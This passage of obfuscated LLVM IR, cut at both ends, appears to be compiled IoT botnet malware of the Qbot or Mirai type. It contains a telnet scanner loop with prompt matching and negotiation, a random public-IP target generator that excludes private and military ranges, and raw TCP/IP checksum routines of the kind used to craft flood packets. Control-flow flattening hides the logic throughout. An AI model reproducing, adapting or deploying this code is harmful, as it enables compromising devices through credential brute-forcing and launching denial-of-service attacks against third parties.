  %77 = select i1 %76, i32 1536592204, i32 -736444521
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -1904686157, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 -1525627372, i32 2062698129
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -1525627372, i32 936440468
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 524829097, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 -268244748, i32 1007642696
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 565610550, i32 -741210901
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 565610550, i32 560365056
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 524829097, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 -1033486029, i32 1384828417
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 524829097, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1690173937, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 109639907, i32 -740712131
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -1639776528, i32 712516613
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 109639907, i32 712516613
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 -1904686157, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1690173937, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 110916817, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 2103851316, i32 26685610
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 524829097, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 524829097, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 -991662428, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -991662428, label %14
    i32 490200591, label %19
    i32 678048650, label %24
    i32 523032621, label %29
    i32 -1480685192, label %34
    i32 -416538699, label %39
    i32 427572560, label %44
    i32 117458716, label %49
    i32 1039090626, label %54
    i32 704025038, label %59
    i32 1341134506, label %64
    i32 -757939032, label %69
    i32 1664936746, label %74
    i32 -13287477, label %79
    i32 -777617011, label %84
    i32 1093785016, label %89
    i32 -2084144846, label %94
    i32 1191819660, label %99
    i32 -2030892878, label %104
    i32 706370550, label %109
    i32 418885377, label %114
    i32 1213935553, label %119
    i32 1911573871, label %124
    i32 1478759455, label %129
    i32 -2028780085, label %134
    i32 1388150294, label %139
    i32 -711403717, label %144
    i32 -1212976420, label %149
    i32 149139282, label %154
    i32 -1241311286, label %159
    i32 -392873972, label %164
    i32 816405633, label %169
    i32 541323392, label %174
    i32 131918686, label %179
    i32 -835357168, label %183
    i32 11848340, label %184
    i32 -2100704345, label %186
    i32 1657981564, label %199
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  %18 = select i1 %17, i32 11848340, i32 490200591
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 0
  %23 = select i1 %22, i32 11848340, i32 678048650
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 3
  %28 = select i1 %27, i32 11848340, i32 523032621
  store i32 %28, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 15
  %33 = select i1 %32, i32 11848340, i32 -1480685192
  store i32 %33, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 16
  %38 = select i1 %37, i32 11848340, i32 -416538699
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 56
  %43 = select i1 %42, i32 11848340, i32 427572560
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  %48 = select i1 %47, i32 11848340, i32 117458716
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 192
  %53 = select i1 %52, i32 1039090626, i32 704025038
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 168
  %58 = select i1 %57, i32 11848340, i32 704025038
  store i32 %58, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 172
  %63 = select i1 %62, i32 1341134506, i32 1664936746
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sge i32 %66, 16
  %68 = select i1 %67, i32 -757939032, i32 1664936746
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %71, 32
  %73 = select i1 %72, i32 11848340, i32 1664936746
  store i32 %73, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 100
  %78 = select i1 %77, i32 -13287477, i32 1093785016
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  %83 = select i1 %82, i32 -777617011, i32 1093785016
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp slt i32 %86, 127
  %88 = select i1 %87, i32 11848340, i32 1093785016
  store i32 %88, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 169
  %93 = select i1 %92, i32 -2084144846, i32 1191819660
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp sgt i32 %96, 254
  %98 = select i1 %97, i32 11848340, i32 1191819660
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 198
  %103 = select i1 %102, i32 -2030892878, i32 418885377
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp sge i32 %106, 18
  %108 = select i1 %107, i32 706370550, i32 418885377
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %111, 20
  %113 = select i1 %112, i32 11848340, i32 418885377
  store i32 %113, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 224
  %118 = select i1 %117, i32 11848340, i32 1213935553
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 6
  %123 = select i1 %122, i32 -835357168, i32 1911573871
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 7
  %128 = select i1 %127, i32 -835357168, i32 1478759455
  store i32 %128, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 11
  %133 = select i1 %132, i32 -835357168, i32 -2028780085
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 21
  %138 = select i1 %137, i32 -835357168, i32 1388150294
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 22
  %143 = select i1 %142, i32 -835357168, i32 -711403717
  store i32 %143, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 26
  %148 = select i1 %147, i32 -835357168, i32 -1212976420
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 28
  %153 = select i1 %152, i32 -835357168, i32 149139282
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 29
  %158 = select i1 %157, i32 -835357168, i32 -1241311286
  store i32 %158, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 30
  %163 = select i1 %162, i32 -835357168, i32 -392873972
  store i32 %163, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 33
  %168 = select i1 %167, i32 -835357168, i32 816405633
  store i32 %168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 55
  %173 = select i1 %172, i32 -835357168, i32 541323392
  store i32 %173, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 214
  %178 = select i1 %177, i32 -835357168, i32 131918686
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 215
  store i32 -835357168, i32* %switchVar
  store i1 %182, i1* %.reg2mem
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 11848340, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %185 = select i1 %.reload3, i32 -2100704345, i32 1657981564
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = call i32 @rand() #2
  %188 = srem i32 %187, 223
  %189 = trunc i32 %188 to i8
  store i8 %189, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %190 = call i32 @rand() #2
  %191 = srem i32 %190, 255
  %192 = trunc i32 %191 to i8
  store i8 %192, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %193 = call i32 @rand() #2
  %194 = srem i32 %193, 255
  %195 = trunc i32 %194 to i8
  store i8 %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %196 = call i32 @rand() #2
  %197 = srem i32 %196, 255
  %198 = trunc i32 %197 to i8
  store i8 %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  store i32 -991662428, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 16, i32 16, i1 false)
  %201 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %202 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %203 = zext i8 %202 to i32
  %204 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %205 = zext i8 %204 to i32
  %206 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %207 = zext i8 %206 to i32
  %208 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %209 = zext i8 %208 to i32
  %210 = call i32 (i8*, i8*, ...) @szprintf(i8* %201, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.346, i32 0, i32 0), i32 %203, i32 %205, i32 %207, i32 %209)
  %211 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %212 = call i32 @inet_addr(i8* %211) #2
  ret i32 %212

loopEnd:                                          ; preds = %186, %184, %183, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -1037483026, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1037483026, label %6
    i32 1211963131, label %10
    i32 684024233, label %19
    i32 1680884513, label %23
    i32 -527433416, label %30
    i32 18431860, label %31
    i32 587726905, label %36
    i32 -1703288754, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 1211963131, i32 684024233
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -1037483026, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 1680884513, i32 -527433416
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -527433416, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 18431860, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 587726905, i32 -1703288754
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 18431860, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
